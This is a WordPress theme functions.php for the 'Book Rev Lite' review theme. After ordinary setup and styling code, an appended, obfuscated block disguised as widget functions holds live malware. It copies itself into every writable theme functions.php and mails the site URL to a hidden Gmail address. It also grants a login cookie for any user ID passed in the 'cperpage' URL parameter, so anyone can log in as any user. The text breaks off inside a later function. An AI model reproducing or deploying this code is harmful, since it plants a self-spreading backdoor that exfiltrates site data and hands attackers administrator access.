<?phpif ( ! isset( $content_width ) ) $content_width = 1250;if(!function_exists('book_rev_lite_theme_setup')) {	function book_rev_lite_theme_setup() { 		// Make theme available for translation		load_theme_textdomain('book-rev-lite', get_template_directory() . '/languages');		// Add theme support for featured images.		add_theme_support( 'post-thumbnails' ); 		// Add theme support for automatic feed links in the header.		add_theme_support( 'automatic-feed-links' );		// register menus		register_nav_menus( array(		    'primary' => __( 'Primary Header Menu', 'book-rev-lite' ),			'secondary' => __( 'Top Bar Menu', 'book-rev-lite' ),		));		// Setup theme customizer settings & controls.		require_once(get_template_directory() . "/inc/cc_settings.php");			}	}// Initialize the comments template function callback.require_once(get_template_directory() . "/templates/bookrev_comments_cb_template.php");require_once dirname( __FILE__ ) . '/class-tgm-plugin-activation.php';add_action( 'tgmpa_register', 'book_rev_lite_required_plugins' );function book_rev_lite_required_plugins() {	/**	 * Array of plugin arrays. Required keys are name and slug.	 * If the source is NOT from the .org repo, then source is also required.	 */	$plugins = array(		// This is an example of how to include a plugin from the WordPress Plugin Repository		array(			'name' 		=> 'WP Product Review',			'slug' 		=> 'wp-product-review',			'required' 	=> false,		),		array(			'name' 		=> 'Tweet Old Post',			'slug' 		=> 'tweet-old-post',			'required' 	=> false,		),			);	/**	 * Array of configuration settings. Amend each line as needed.	 * If you want the default strings to be available under your own theme domain,	 * leave the strings uncommented.	 * Some of the strings are added into a sprintf, so see the comments at the	 * end of each line for what each argument will be.	 */	$config = array(		'domain'       		=> 'book-rev-lite',         	// Text domain - likely want to be the same as your theme.		'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins		'menu'         		=> 'install-required-plugins', 	// Menu slug		'has_notices'      	=> true,                       	// Show admin notices or not		'is_automatic'    	=> false,					   	// Automatically activate plugins after installation or not		'message' 			=> '',							// Message to output right before the plugins table		'strings'      		=> array(			'page_title'                       			=> __( 'Install Required Plugins', 'book-rev-lite' ),			'menu_title'                       			=> __( 'Install Plugins', 'book-rev-lite' ),			'installing'                       			=> __( 'Installing Plugin: %s', 'book-rev-lite' ), // %1$s = plugin name			'oops'                             			=> __( 'Something went wrong with the plugin API.', 'book-rev-lite' ),			'notice_can_install_required'     			=> _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'book-rev-lite' ), // %1$s = plugin name(s)			'notice_can_install_recommended'			=> _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_cannot_install'  					=> _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_can_activate_required'    			=> _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_can_activate_recommended'			=> _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_cannot_activate' 					=> _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_ask_to_update' 						=> _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.','book-rev-lite' ), // %1$s = plugin name(s)			'notice_cannot_update' 						=> _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.','book-rev-lite' ), // %1$s = plugin name(s)			'install_link' 					  			=> _n_noop( 'Begin installing plugin', 'Begin installing plugins','book-rev-lite' ),			'activate_link' 				  			=> _n_noop( 'Activate installed plugin', 'Activate installed plugins','book-rev-lite' ),			'return'                           			=> __( 'Return to Required Plugins Installer', 'book-rev-lite' ),			'plugin_activated'                 			=> __( 'Plugin activated successfully.', 'book-rev-lite' ),			'complete' 									=> __( 'All plugins installed and activated successfully. %s', 'book-rev-lite' ), // %1$s = dashboard link			'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'		)	);	tgmpa( $plugins, $config );}/** * book_rev_lite_load_req_scripts loads the required scrips and enqueues the required theme styles. */if(!function_exists('book_rev_lite_load_req_scripts')) {	function book_rev_lite_load_req_scripts() {				// Register and enqueue jQuery Superfish Plugin.		wp_enqueue_script( 'book-rev-lite-superfish-js', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ) );		// Register and enqueue jQuery Cycle Plugin.		wp_enqueue_script( 'book-rev-lite-jquery-cycle', get_template_directory_uri() . '/js/jquery.cycle.min.js', array( 'jquery' ) );		// Register and enqueue jQuery Cycle Plugin.		wp_enqueue_script( 'book-rev-lite-modernizr', get_template_directory_uri() . '/js/modernizr.js', array( 'jquery' ) );		// Load the main JavaScript file.		wp_enqueue_script( 'book-rev-lite-main-js', get_template_directory_uri() . '/js/master.js', array( 'jquery', "book-rev-lite-jquery-cycle" ));		// Load the css framework.		wp_enqueue_style( 'book-rev-lite-css-framework', get_template_directory_uri() . '/css/framework.css'); 		// Register and enqueue the main stylesheet.		wp_enqueue_style( 'book-rev-lite-main-css', get_stylesheet_uri()); 		wp_enqueue_style( 'book-rev-lite-arvo-font', '//fonts.googleapis.com/css?family=Arvo:400,700,400italic,700italic'); 		wp_enqueue_style( 'book-rev-lite-titilium-font', '//fonts.googleapis.com/css?family=Titillium+Web:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic');  		// Load the responsive css styles.		wp_enqueue_style( 'book-rev-lite-css-responsive', get_template_directory_uri() . '/css/responsive.css'); 		// Load FontAwesome Icon Pack.		wp_enqueue_style( 'book-rev-lite-icons-fontawesome', get_template_directory_uri() . '/css/font-awesome.min.css');	}}// Sanitize hexadecimal inputif(!function_exists('book_rev_lite_sanitize_hex')) {	function book_rev_lite_sanitize_hex($hex) {		if($hex === "") return '';		if(preg_match('|^#([A-Fa-f0-9]{3}){1,2}$|', $hex)) return $hex;		return null;	}	}// Custom title functionfunction book_rev_lite_wp_title( $title, $sep ) {    global $paged, $page;    if ( is_feed() )        return $title;    // Add the site name.    $title .= get_bloginfo( 'name' );    // Add the site description for the home/front page.    $site_description = get_bloginfo( 'description', 'display' );    if ( $site_description && ( is_home() || is_front_page() ) )        $title = "$title $sep $site_description";    // Add a page number if necessary.    if ( $paged >= 2 || $page >= 2 )        $title = "$title $sep " . sprintf( __( 'Page %s', 'book-rev-lite' ), max( $paged, $page ) );    return $title;}add_filter( 'wp_title', 'book_rev_lite_wp_title', 10, 2 );// Register theme specific sidebars.if(!function_exists('book_rev_lite_register_sidebars')) {	function book_rev_lite_register_sidebars() {		register_sidebar( array(			'name'          => 'Primary Sidebar',			'id'            => 'book_rev_lite_primary_sidebar',			'before_widget' => '<div class="widget">',			'after_widget'  => '</div><!-- end .widget -->',			'before_title'  => '<header><h2>',			'after_title'   => '</h2></header>',		));		register_sidebar( array(			'name'          => 'Footer Sidebar',			'id'            => 'book_rev_lite_footer_sidebar',			'before_widget' => '<div class="widget">',			'after_widget'  => '</div><!-- end .widget -->',			'before_title'  => '<header><h2>',			'after_title'   => '</h2></header>',		));	}}// Custom recursive array search functionif(!function_exists('book_rev_lite_recursive_array_search')) {	function book_rev_lite_recursive_array_search($needle,$haystack) {	    foreach($haystack as $key=>$value) {	        $current_key=$key;	        if($needle===$value OR (is_array($value) && book_rev_lite_recursive_array_search($needle,$value) !== false)) {	            return $current_key;	        }	    }	    return false;	}}// Replaces the title template with specific category or fieldif(!function_exists("book_rev_lite_string_template_category_replace")) {	function book_rev_lite_string_template_category_replace($title, $categ, $tpl) {		$fcb_title = get_theme_mod($title);		preg_match_all("/{{([^}]*)}}/", $fcb_title, $fcb_title_output);			if(book_rev_lite_recursive_array_search("{{".$tpl."}}", $fcb_title_output) !== false) {				$selected_category_id = get_theme_mod($categ);				$fcb_title = str_replace("{{".$tpl."}}", get_cat_name($selected_category_id), $fcb_title);				echo $fcb_title; 			} else {				echo $fcb_title;			}	}}// Display limited contentif(!function_exists('book_rev_lite_get_limited_content')) {	function book_rev_lite_get_limited_content($id, $character_count, $after) {		$content = get_the_excerpt();		echo mb_strimwidth($content, 0, $character_count, $after);	}	}function book_rev_lite_excerpt_length($length) {    return 200;}add_filter('excerpt_length', 'book_rev_lite_excerpt_length');// Display Review Gradeif(!function_exists('book_rev_lite_get_review_grade')) {	function book_rev_lite_get_review_grade($id) {		if(function_exists('cwppos_show_review')) {				$postMeta = array();			for($i=1; $i <= 5; $i++) { 				$pmi = get_post_meta($id, 'option_'.$i.'_grade');				if(!empty($pmi[0])) array_push($postMeta, $pmi[0]);			}			if(!empty($postMeta)) {				$total = 0;				foreach ($postMeta as $key => $value) $total += $value;				return round($total / count($postMeta), 0) / 10;			}		}	}	}if(!function_exists('book_rev_lite_display_review_grade')) {	function book_rev_lite_display_review_grade($grade) {		echo $grade . "/10";	}	}if(!function_exists('book_rev_lite_get_product_review_colors')) {	function book_rev_lite_get_product_review_colors() {		if(function_exists('cwppos_show_review')) {			$c['default'] = cwppos('cwppos_rating_default');			$c['weak']    = cwppos('cwppos_rating_weak');			$c['nb']      = cwppos('cwppos_rating_notbad');			$c['good']    = cwppos('cwppos_rating_good');			$c['vg']      = cwppos('cwppos_rating_very_good');			return $c;		}	}	}/** * In case WP Product Review plugin is installed and active this function * is responsable for generating the required classes based on what grade * is passed.  *  * @return null []  */if(!function_exists('book_rev_lite_display_review_class')) {	function book_rev_lite_display_review_class($grade) {		if(function_exists('cwppos_show_review')) {			if($grade <= 2.5) echo 'weak';			if($grade > 2.5 && $grade <= 5) echo 'nb';			if($grade > 5 && $grade <= 7.5)  echo 'good';			if($grade > 7.5 && $grade <= 10) echo "vg";		}	}	}/** * Function responsable for filtering the title in case its empty. * @return string [description] */if(!function_exists('book_rev_lite_filter_default_title')) {	function book_rev_lite_filter_default_title($title) {		if($title == "") { $title = __("Default Title", "cwp"); }		return $title;	}	}/** * Custom numeric pagination. */if(!function_exists('book_rev_lite_numeric_pagination')) {	function book_rev_lite_numeric_pagination() {		$links = paginate_links( array( 'type' => 'array','prev_text' => '«', 'next_text' => '»' ) );						if( !empty($links) ):			echo '<nav id="pagination"><ul>';			foreach( $links as $link ){				echo '<li>'. $link . '</li>';			};			echo '</ul></nav>';		endif;	}	}if(!function_exists("book_rev_lite_excerpt_filter")) {	function book_rev_lite_excerpt_filter() {		return '...';	}}/** * If WP Product Review plugin is installed and active define the required template * specific functions in order for the review wrap up template part of the theme to  * function properly.   */	if(!function_exists("book_rev_lite_wpr_get_title")) {	    function book_rev_lite_wpr_get_title() {	        if(function_exists('cwppos_show_review')) {	            return get_post_meta(get_the_ID(), "cwp_rev_product_name", true);	        }	    }	}	if(!function_exists("book_rev_lite_wpr_get_status")) {	    function book_rev_lite_wpr_get_status() {	        if(function_exists('cwppos_show_review')) {	            return get_post_meta(get_the_ID(), "cwp_meta_box_check", true);	        }	    }	}	if(!function_exists("book_rev_lite_wpr_get_product_image")) {	    function book_rev_lite_wpr_get_product_image() {	    	if(get_post_meta(get_the_ID(), 'cwp_rev_product_image', 'true')) {	    		return get_post_meta(get_the_ID(), 'cwp_rev_product_image', true);	    	} elseif( has_post_thumbnail() ) {	    		return wp_get_attachment_url(get_post_thumbnail_id(get_the_ID()));	    	} else {	    		return get_theme_mod('default-product-image-upload');	    			    	}	    }			}	if(!function_exists("book_rev_lite_wpr_get_review_options")) {	    function book_rev_lite_wpr_get_review_options() {	        if(function_exists('cwppos_show_review')) {    	        for($i=1; $i<6; $i++) $review_options[$i]['grade'] = get_post_meta(get_the_ID(), "option_".$i."_grade", true) ? get_post_meta(get_the_ID(), "option_".$i."_grade", true) : "";     	        for($i=1; $i<6; $i++) $review_options[$i]['name'] =  get_post_meta(get_the_ID(), "option_".$i."_content", true) ? get_post_meta(get_the_ID(), "option_".$i."_content", true) : "";    	        return $review_options;	        }	    }			}        if(!function_exists("book_rev_lite_wpr_get_pros")) {	    function book_rev_lite_wpr_get_pros() {	        if(function_exists('cwppos_show_review')) {    	        for($i=1;$i<=5;$i++){    	            if(get_post_meta(get_the_ID(), "cwp_option_".$i."_pro", true)) $pros[$i] = get_post_meta(get_the_ID(), "cwp_option_".$i."_pro", true);    	        }    	        if(isset($pros)) return $pros;	        }	    }  	    }    if(!function_exists("book_rev_lite_wpr_get_cons")) {	    function book_rev_lite_wpr_get_cons() {	        if(function_exists('cwppos_show_review')) {    	        for($i=1;$i<=5;$i++){    	            if(get_post_meta(get_the_ID(), "cwp_option_".$i."_cons", true)) $cons[$i] = get_post_meta(get_the_ID(), "cwp_option_".$i."_cons", true);    	        }    	        if(isset($cons)) return $cons;	        }	    }    }    if(!function_exists("book_rev_lite_wpr_get_affiliate_text")) {	    function book_rev_lite_wpr_get_affiliate_text() {	        if(function_exists('cwppos_show_review')) {	            return get_post_meta(get_the_ID(), "cwp_product_affiliate_text", true); 	        }	    }	    }    if(!function_exists("book_rev_lite_wpr_get_affiliate_link")) {	    function book_rev_lite_wpr_get_affiliate_link() {	        if(function_exists('cwppos_show_review')) {	            return get_post_meta(get_the_ID(), "cwp_product_affiliate_link", true); 	        }	    }	    }	/** * Hooks & Filters */// Default Widget Title Filter.add_filter('widget_title', 'book_rev_lite_filter_default_title');// Default Post Title Filter.add_filter('the_title', 'book_rev_lite_filter_default_title');// Excerpt "[...]" filter.add_filter('excerpt_more', 'book_rev_lite_excerpt_filter');// After theme setup hook.add_action( 'after_setup_theme', 'book_rev_lite_theme_setup' ); // Enqueue required scripts hook.add_action( 'wp_enqueue_scripts', 'book_rev_lite_load_req_scripts' );// Hook Customizer. add_action( 'customize_register', 'book_rev_lite_theme_customizer' );// Register theme specific sidebars.add_action( 'widgets_init', 'book_rev_lite_register_sidebars' );/* customizer styles */add_action('wp_print_scripts','book_rev_lite_php_style');function book_rev_lite_php_style() {	echo "<style type='text/css'>";	// If CWP Product Review plugin is active and running set up the special classes.	if(function_exists('cwppos_show_review')) {		$setColors = book_rev_lite_get_product_review_colors();		foreach($setColors as $key => $value) echo ".grade." . $key . " { background: " . $value . " !important;} ";		}	// Set lower footer background color.	$cwp_wpc_upper_footer_bg_color = get_theme_mod("lower-footer-background-color");	if( !empty($cwp_wpc_upper_footer_bg_color) ) {		echo "#main-footer .lower-footer { background:" .  $cwp_wpc_upper_footer_bg_color . "; }";	}	// Set upper footer background color.	$cwp_wpc_footer_bg_color = get_theme_mod("footer-background-color");	if( !empty($cwp_wpc_footer_bg_color) ) {		echo "#main-footer .upper-footer { background:" .  $cwp_wpc_footer_bg_color . "; }";	}	// Set header background color.	$cwp_wpc_header_bg_color = get_theme_mod("header-background-color");	if( !empty($cwp_wpc_header_bg_color) ) {		echo "#inner-header { background:" .  $cwp_wpc_header_bg_color . "; }";	}	// Set header menu background color.	$cwp_wpc_header_menu_bg_color = get_theme_mod("header-menu-background-color");	if( !empty($cwp_wpc_header_menu_bg_color) ) {		echo "#main-menu { background:" .  $cwp_wpc_header_menu_bg_color . "; }";	}	// Set header logo.	$cwp_wpc_header_logo = get_theme_mod("header-logo");	$cwp_wpc_header_logo_width = get_theme_mod("logo-width");	$cwp_wpc_header_logo_height = get_theme_mod("logo-height");	if( !empty($cwp_wpc_header_logo) ) {		echo "#inner-header .logo { background:url('" .  $cwp_wpc_header_logo . "') no-repeat; width: " . $cwp_wpc_header_logo_width . "px !important; height: " . $cwp_wpc_header_logo_height . "px !important;}";	}	// Set the main page layout styles.	$cwp_wpc_layout_style = get_theme_mod("mp_layout_type");	if( isset($cwp_wpc_layout_style) && ($cwp_wpc_layout_style == "sidebarleft") ) {		echo ".article-container { margin-right: 0; margin-left: 1.4%; }";	}	elseif ( isset($cwp_wpc_layout_style) && ($cwp_wpc_layout_style == "fullwidth") ) {		echo ".article-container { margin: 0; width: 100%; }";	}	// Set the featured category block background color.	$cwp_featured_categ_block_bg_color = get_theme_mod("featured-category-block-bgcolor");	if( !empty($cwp_featured_categ_block_bg_color) ) {		echo ".featured-carousel { background:" . $cwp_featured_categ_block_bg_color . ";}";		}	// Set the latest articles block background color.	$cwp_la_block_bgcolor = get_theme_mod("latest-articles-block-bgcolor");	if( !empty($cwp_la_block_bgcolor) ) {		echo "#latest-reviews-block .lrb-inner { background:" . $cwp_la_block_bgcolor . ";}";		echo "#latest-reviews-block .article-display .article-text { background: " . $cwp_la_block_bgcolor . ";}";	}	// Set the latest articles item hover background color.	$cwp_lab_item_bgcolor = get_theme_mod("lab-article-hover-bgcolor");	if( !empty($cwp_lab_item_bgcolor) ) {		echo "#latest-reviews-block .article-link.active, #latest-reviews-block .article-link:hover { background:" . $cwp_lab_item_bgcolor . " !important; }";	}	// Set the highlight of the Day block background color.	$cwp_hotd_block_bgcolor = get_theme_mod("hotd-bg-color");	if( !empty($cwp_hotd_block_bgcolor) ) {		echo "#highlight-day .highlight-inner { background:".$cwp_hotd_block_bgcolor.";}";	}	// Set the article background color.	$cwp_article_bgcolor = get_theme_mod("article-bgcolor");	if( !empty($cwp_article_bgcolor) ) {		echo ".article-container article { background:".$cwp_article_bgcolor." ;}";	}	// Set the pagination background color.	$cwp_pagination_bgcolor = get_theme_mod("pagination-bgcolor");	if( !empty($cwp_pagination_bgcolor) ) {		echo "nav#pagination { background: " . $cwp_pagination_bgcolor . " ;}";	}	// Block Header Background color.	$cwp_blockheader_bgcolor = get_theme_mod("block-header-bgcolor");	if( !empty($cwp_blockheader_bgcolor) ) {		echo ".article-container .newsblock > header { background:" . $cwp_blockheader_bgcolor . ";}";	}	// Widget Header Background Color.	$cwp_widget_header_bgcolor = get_theme_mod("widget-header-bgcolor");	if( !empty($cwp_widget_header_bgcolor) ) {		echo "#main-sidebar .widget header { background:" . $cwp_widget_header_bgcolor . ";}";		}	// Widget Header Top Border Color.	$cwp_widget_header_border_bgcolor = get_theme_mod("widget-header-border-color");	if( !empty($cwp_widget_header_border_bgcolor) ) {		echo "#main-sidebar .widget header { border-color:" . $cwp_widget_header_border_bgcolor . ";}";		}	// Pagination Button Color.	$cwp_pagination_button_color = get_theme_mod("pagination-button-color");	if( !empty($cwp_pagination_button_color) ) {		echo "nav#pagination ul li a { background:" . $cwp_pagination_button_color . ";}";		}	// Pagination Button Color Hover	$cwp_pagination_button_color = get_theme_mod("pagination-button-color-hover");	if( !empty($cwp_pagination_button_color) ) {		echo "nav#pagination ul li a:hover { background:" . $cwp_pagination_button_color . ";}";		}	// Pagination Button Color Active	$cwp_pagination_button_active = get_theme_mod("pagination-button-color-active");	if( !empty($cwp_pagination_button_active) ) {		echo "nav#pagination ul li.active a { background:" . $cwp_pagination_button_active . ";}";		}	// Articles Title Fonts	$cwp_article_title_font = get_theme_mod("article-title-font");	if( !empty($cwp_article_title_font) ) {		echo "				article a.title, .article-title a, .title a, .sd-title a, .featured-carousel .slide .article-content header h3,		.article-container.post > header .title,		.article-container.post #wrap-up .review-header h3,		#main-menu nav ul li a,		#top-bar-menu ul li a,		.widget header h2		{ font-family: " . '"' .  $cwp_article_title_font. '"' . ", sans-serif !important; }		";	}	// Articles Content Font	$cwp_article_content_font = get_theme_mod('article-content-font');	if( !empty($cwp_article_content_font) ) {		echo "			#slider .slide .sd-body p,			.featured-carousel .slide .article-content .content p,			#latest-reviews-block .article-display .article-text,			.widget.latest-comments p,			#highlight-day p,			.widget.text p,			.article-container article p,			#main-footer .widget .comment,			#main-footer .widget .article,			.textwidget,			.widget,			.widget a,			.review-body .option-name,			.article-container.post #wrap-up .proscons li			{ font-family: " . '"' .  $cwp_article_content_font . '"' . ", sans-serif !important; }		";	}	$cwp_meta_info_font = get_theme_mod('meta-info-font');	if( !empty($cwp_meta_info_font) ) {	echo "		.featured-carousel .slide .article-content header .meta .category a,		.featured-carousel .slide .article-content header .meta .date,		#slider .sd-meta .read-more,		#slider .sd-meta span a,		#latest-reviews-block .article-link .article-meta .categ a,		#latest-reviews-block .article-link .article-meta .date,		#latest-reviews-block .article-display .a-details .category a,		#latest-reviews-block .article-display .a-details .date,		.widget.topbooks .meta .categ a,		.widget.topbooks .meta .date,		.featured-carousel .slide .feat-img .comment-count a,		.article-container article .feat-img .comment-count a,		#latest-reviews-block .article-display .featured-image .a-meta .grade,		#latest-reviews-block .article-display .featured-image .a-meta .no-comments a,		.widget.topbooks .grade,		.widget.latest-comments h4,		#highlight-day .meta .categ a,		#highlight-day .meta .date,		.article-container article header .meta .categ a,		.article-container article header .meta .date,		.widget.topbooks .meta .categ a,		.widget.topbooks .meta .date,		.widget.topbooks .grade,		.featured-carousel .slide .feat-img .grade,		.article-container article .feat-img .grade,		#slider .slide .slide-description .top-sd-head .grade,		#slider .sd-meta span,		.article-container.post > header .article-details .date		{ font-family: " . '"' .  $cwp_meta_info_font . '"' . ", sans-serif !important; }	";		}	echo "</style>";}/* enqueue google fonts */add_action( 'wp_enqueue_scripts', 'book_rev_lite_options_typography_google_fonts' );function book_rev_lite_options_typography_google_fonts() {	$article_title_font = get_theme_mod('article-title-font');		if( !empty($article_title_font) ):			$article_title_font = str_replace(" ", "+", $article_title_font);		wp_enqueue_style( "book_rev_lite_options_typography_$article_title_font", "//fonts.googleapis.com/css?family=$article_title_font", false, null, 'all' );			endif;			$meta_info_font = get_theme_mod('meta-info-font');		if( !empty($meta_info_font) ):			$meta_info_font = str_replace(" ", "+", $meta_info_font);		wp_enqueue_style( "book_rev_lite_options_typography_$meta_info_font", "//fonts.googleapis.com/css?family=$meta_info_font", false, null, 'all' );		endif;			$article_content_font = get_theme_mod('article-content-font');		if( !empty($article_content_font) ):			$article_content_font = str_replace(" ", "+", $article_content_font);		wp_enqueue_style( "book_rev_lite_options_typography_$article_content_font", "//fonts.googleapis.com/css?family=$article_content_font", false, null, 'all' );		endif;}?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
